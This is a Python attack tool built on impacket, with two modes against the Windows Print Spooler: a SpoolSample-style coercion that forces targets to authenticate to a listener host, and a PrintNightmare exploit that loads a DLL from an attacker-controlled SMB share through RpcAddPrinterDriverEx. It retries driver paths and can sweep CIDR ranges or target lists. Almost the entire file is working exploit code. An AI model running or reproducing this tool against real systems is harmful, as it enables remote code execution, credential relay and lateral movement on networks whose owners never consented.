import argparse
import ipaddress
import re
import socket
import pathlib
import json
import binascii
import logging
import logging.config

from time import sleep

from impacket.dcerpc.v5 import rprn, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.structure import Structure


# +-----------------------+
# | Logging Configuration |
# +-----------------------+
config_file = "./logging.json"
with open(config_file, "r", encoding="utf-8") as config_fd:
	config = json.load(config_fd)

logging.config.dictConfig(config["logging"])
log = logging.getLogger(__name__)


# Terminal Colors
BLUE   = '\033[38;5;39m'
GREEN  = '\033[38;5;47m'
YELLOW = '\033[38;5;190m'
ORANGE = '\033[38;5;208m'
RED    = '\033[38;5;196m'
BOLD   = '\033[1m'
TCEND  = '\033[0m'


class DRIVER_INFO_2_BLOB(Structure):
	structure = (
			('cVersion', '<L'),
			('NameOffset', '<L'),
			('EnvironmentOffset', '<L'),
			('DriverPathOffset', '<L'),
			('DataFileOffset', '<L'),
			('ConfigFileOffset', '<L')
		)

	def __init__(self, data=None):
		Structure.__init__(self, data=data)

	def fromString(self, data):
		Structure.fromString(self, data)
		
		self['ConfigFileArray']  = self.rawData[self['ConfigFileOffset']:self['DataFileOffset']].decode('utf-16-le')
		self['DataFileArray']    = self.rawData[self['DataFileOffset']:self['DriverPathOffset']].decode('utf-16-le')
		self['DriverPathArray']  = self.rawData[self['DriverPathOffset']:self['EnvironmentOffset']].decode('utf-16-le')
		self['EnvironmentArray'] = self.rawData[self['EnvironmentOffset']:self['NameOffset']].decode('utf-16-le')
		self['NameArray']        = self.rawData[self['NameOffset']:len(self.rawData)].decode('utf-16-le')

class DcePrinterPwn:
	def __init__(self):
		self._dce = None

		# Configured by caller
		self.rhost  = None
		self.rport  = None
		self.lhost  = None
		self.lshare = None

		self.domain = None
		self.user   = None
		self.passwd = None

		# Initialized by call_open_printer()
		self._handle = NULL

		# Nightmare specific vars
		self._drivers = None

	def _log_blob(self):
		blob = {
			"rhost":   f"{self.rhost}",
			"rport":   self.rport,
			"lhost":   f"{self.lhost}",
			"lshare":  f"{self.lshare}",
			"domain":  f"{self.domain}",
			"user":    f"{self.user}"
		}

		if self._handle == NULL:
			blob["handle"] = None
		
		else:
			blob["handle"] = f"{binascii.hexlify(self._handle, sep=':').decode('utf-8')}"

		return blob

	def connect(self):
		assert self.rhost  != None and self.rport != None
		assert self.domain != None and self.user  != None
		assert self.passwd != None

		lb = self._log_blob()
		lb["messages"] = []

		# Make connection to remote host
		bindStr  = f"ncacn_np:{self.rhost}[\\pipe\\spoolss]"
		rpcTrans = transport.DCERPCTransportFactory(bindStr)

		rpcTrans.set_dport(self.rport)

		if hasattr(rpcTrans, 'set_credentials'):
			rpcTrans.set_credentials(self.user, self.passwd,
									 self.domain, nthash='')

		self._dce = rpcTrans.get_dce_rpc()

		try:
			self._dce.connect()
			
			lb["messages"].append({"type": "connect", "success": True, "error": None})

		except Exception as e:
			lb["messages"].append({"type": "connect", "success": False, "error": f"{str(e)}"})
			log.debug(json.dumps(lb))
			return False

		try:
			self._dce.bind(rprn.MSRPC_UUID_RPRN)
			
			lb["messages"].append({"type": "bind", "success": True, "error": None})

		except Exception as e:
			lb["messages"].append({"type": "bind", "success": False, "error": f"{str(e)}"})
			log.debug(json.dumps(lb))
			return False

		log.debug(json.dumps(lb))
		return True

	def call_open_printer(self):
		assert self._dce != None

		lb = self._log_blob()
		lb["messages"] = []

		try:
			rpcOpenStr = f"\\\\{self.rhost}"
			resp = rprn.hRpcOpenPrinter(self._dce, rpcOpenStr)
			self._handle = resp["pHandle"]

			lb["messages"].append({"type": "open.printer", "success": True, "error": None})

		except Exception as e:
			self._dce.disconnect()

			lb["messages"].append({"type": "open.printer", "success": False, "error": f"{str(e)}"})
			log.debug(json.dumps(lb))
			return False

		log.debug(json.dumps(lb))
		return True

	def call_remote_printer_change(self):
		assert self._dce  != None
		assert self.lhost != None

		lb = self._log_blob()
		lb["messages"] = []

		try:
			pszLocalMachine = f"\\\\{self.lhost}\\0x00"
			resp = rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
					self._dce, self._handle, rprn.PRINTER_CHANGE_ADD_JOB,
					pszLocalMachine=pszLocalMachine)
			
			lb["messages"].append({"type": "change.printer", "success": True, "error": None})

		except Exception as e:
			self._dce.disconnect()

			lb["messages"].append({"type": "change.printer", "success": False, "error": f"{str(e)}"})
			log.debug(json.dumps(lb))
			return False

		self._dce.disconnect()
		log.debug(json.dumps(lb))
		return True

	def call_enum_printer_drivers(self):
		assert self._dce != None

		lb = self._log_blob()
		lb["messages"] = []

		try:
			resp = rprn.hRpcEnumPrinterDrivers(self._dce, pName=self._handle,
					pEnvironment="Windows x64\x00", Level=2)
			
			data = b''.join(resp['pDrivers'])

			self._drivers = DRIVER_INFO_2_BLOB()
			self._drivers.fromString(data)

			lb["messages"].append({"type": "enum.drivers", "success": True, "error": None})

		except Exception as e:
			self._dce.disconnect()

			lb["messages"].append({"type": "enum.drivers", "success": False, "error": f"{str(e)}"})
			log.debug(json.dumps(lb))
			return False

		log.debug(json.dumps(lb))
		return True

	def call_add_printer_driver(self):
		assert self._dce     != None
		assert self._drivers != None
		assert self.lshare   != None

		lb = self._log_blob()
		lb["messages"] = []
		stage = 0

		try:
			pDriverPath = f"{pathlib.PureWindowsPath(self._drivers['DriverPathArray']).parent}\\UNIDRV.DLL"

			lb["messages"].append({"type": "located.driverpath", "success": True, "path": f"{pDriverPath}", "error": None})

			container_info = rprn.DRIVER_CONTAINER()
			container_info['Level'] = 2
			container_info['DriverInfo']['tag'] = 2
			container_info['DriverInfo']['Level2']['cVersion']     = 3
			container_info['DriverInfo']['Level2']['pName']        = "1234\x00"
			container_info['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
			container_info['DriverInfo']['Level2']['pDriverPath']  = f"{pDriverPath}\x00"
			container_info['DriverInfo']['Level2']['pDataFile']    = f"{self.lshare}\x00"
			container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\kernelbase.dll\x00"

			flags    = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
			filename = self.lshare.split("\\")[-1]

			resp = rprn.hRpcAddPrinterDriverEx(self._dce, pName=self._handle,
					pDriverContainer=container_info, dwFileCopyFlags=flags)

			if (resp['ErrorCode'] == 0):
				lb["messages"].append({"type": "add.driver", "success": True, "stage": stage, "error": None})

			else:
				lb["messages"].append({"type": "add.driver", "success": False, "stage": stage, "error": resp['ErrorCode']})

			for stage in range(1, 30):
				try:
					container_info['DriverInfo']['Level2']['pConfigFile'] = f"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{stage}\\{filename}\x00"
					
					resp = rprn.hRpcAddPrinterDriverEx(self._dce, pName=self._handle,
							pDriverContainer=container_info, dwFileCopyFlags=flags)
					
					if (resp['ErrorCode'] == 0):
						self._dce.disconnect()

						lb["messages"].append({"type": "add.driver", "success": True, "stage": stage, "error": None})
						log.debug(json.dumps(lb))
						return True

					else:
						lb["messages"].append({"type": "add.driver", "success": False, "stage": stage, "error": resp['ErrorCode']})

				except Exception as e:
					lb["messages"].append({"type": "add.driver", "success": False, "stage": stage, "error": f"{str(e)}"})
					pass

		except Exception as e:
			lb["messages"].append({"type": "add.driver", "success": False, "stage": stage, "error": f"{str(e)}"})
			self._dce.disconnect()
			log.debug(json.dumps(lb))
			return False

		self._dce.disconnect()
		log.debug(json.dumps(lb))
		return False


def tcp_port_open(host, port, timeout=1):
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(timeout)
		sock.connect((host, port))
		sock.close()
		return True
	
	except Exception as e:
		sock.close()
		return False

def generate_targets(target):
	if target.startswith("file:"):
		filename = ':'.join(target.split(':')[1:])

		with open(filename, "r", encoding="utf-8") as input_fh:
			targets = input_fh.read()

		for t in targets.split('\n'):
			t = t.strip()
			yield t
	
	elif re.match(r'^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$', target):
		# IPv4 Address
		yield target

	elif re.match(r'^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$', target):
		# IPv4 CIDR Range
		for t in ipaddress.IPv4Network(target):
			yield str(t)

	else:
		# Assumed hostname
		yield target


def get_args_dict():
	args_dict = {
		"attack": None,
		"rhost" : None,
		"rport" : None,
		"lhost" : None,
		"lshare": None, 
		"domain": None,
		"user"  : None,
		"passwd": None
	}

	# Get command-line arguments
	parser = argparse.ArgumentParser()

	parser.add_argument('-a', '--attack', action="store", dest="attack",
		required=True, default=None, choices=["spoolsample", "nightmare"],
		help="Attack type to execute on target(s).")

	parser.add_argument('-rH', '--rhost', action="store", dest="rhost",
		required=True, default=None,
		help="Remote target IP, CIDR range, or filename (file:<path>)")

	parser.add_argument('-rP', '--rport', action="store", dest="rport",
		required=True, default=445, choices=[139, 445], type=int,
		help="Remote SMB server port.")

	# Currently only required for 'spoolsample' attack
	parser.add_argument('-lH', '--lhost', action="store", dest="lhost",
		required=False, default=None, help="Listening hostname or IP")

	# Currently only required for 'nightmare' attack
	parser.add_argument('-lS', '--lshare', action="store", dest="lshare",
		required=False, default=None, help="Staging SMB share (UNC)")

	parser.add_argument('-d', '--domain', action="store", dest="domain",
		required=True, default=None, help="Domain for authentication")

	parser.add_argument('-u', '--username', action="store", dest="user",
		required=True, default=None, help="Username for authentication")

	parser.add_argument('-p', '--password', action="store", dest="passwd",
		required=True, default=None, help="Password for authentication")
	
	args = parser.parse_args()

	args_dict["attack"] = args.attack
	args_dict["rhost"]  = args.rhost
	args_dict["rport"]  = args.rport
	args_dict["lhost"]  = args.lhost
	args_dict["lshare"] = args.lshare
	args_dict["domain"] = args.domain
	args_dict["user"]   = args.user
	args_dict["passwd"] = args.passwd

	return args_dict

def main():
	args = get_args_dict()

	log.debug(f"[START][ARGS] {json.dumps(args)}")

	if args["attack"] == "spoolsample":
		assert args["lhost"] != None
		
		for rhost in generate_targets(args["rhost"]):
			print(f"[{BLUE}*{TCEND}] {rhost}...", end='', flush=True)

			if tcp_port_open(rhost, args["rport"], timeout=1):
				dce = DcePrinterPwn()

				dce.rhost = rhost
				dce.rport = args["rport"]
				dce.lhost = args["lhost"]

				dce.domain = args["domain"]
				dce.user   = args["user"]
				dce.passwd = args["passwd"]

				# Go to next target if connection failed
				if dce.connect() == False:
					print(f"{ORANGE}connection failed{TCEND}")
					continue

				print(f"{BLUE}connected{TCEND}...", end='', flush=True)

				# Go to next target if open printer failed
				if dce.call_open_printer() == False:
					print(f"{ORANGE}open printer failed{TCEND}")
					continue

				print(f"{BLUE}printer opened{TCEND}...", end='', flush=True)

				if dce.call_remote_printer_change() == False:
					print(f"{GREEN}exploited{TCEND}")

				else:
					print(f"{GREEN}exploited{TCEND} ({YELLOW}Printer changed, may need cleanup{TCEND})")

			else:
				print(f"{RED}port closed{TCEND}")
				continue

	elif args["attack"] == "nightmare":
		for rhost in generate_targets(args["rhost"]):
			print(f"[{BLUE}*{TCEND}] {rhost}...", end='', flush=True)

			if tcp_port_open(rhost, args["rport"], timeout=1):
				attempts = 1
				success  = False
				
				while (attempts <= 3) and (success == False):
					print(f"{BLUE}attempt{TCEND} {attempts}...", end='', flush=True)
					
					dce = DcePrinterPwn()

					dce.rhost  = rhost
					dce.rport  = args["rport"]
					dce.lshare = args["lshare"]

					dce.domain = args["domain"]
					dce.user   = args["user"]
					dce.passwd = args["passwd"]

					# Go to next target if connection failed
					if dce.connect() == False:
						attempts = 4

					# Go to next target if enum drivers failed
					if dce.call_enum_printer_drivers() == False:
						attempts = 4

					# Break from loop if successful
					if dce.call_add_printer_driver() == True:
						success = True

					else:
						sleep(10)
						attempts += 1

				if success == True:
					print(f"{GREEN}exploit success{TCEND}")
				
				else:
					print(f"{RED}exploit failed{TCEND}")

			else:
				print(f"{RED}port closed{TCEND}")
				continue

if __name__ == '__main__':
	main()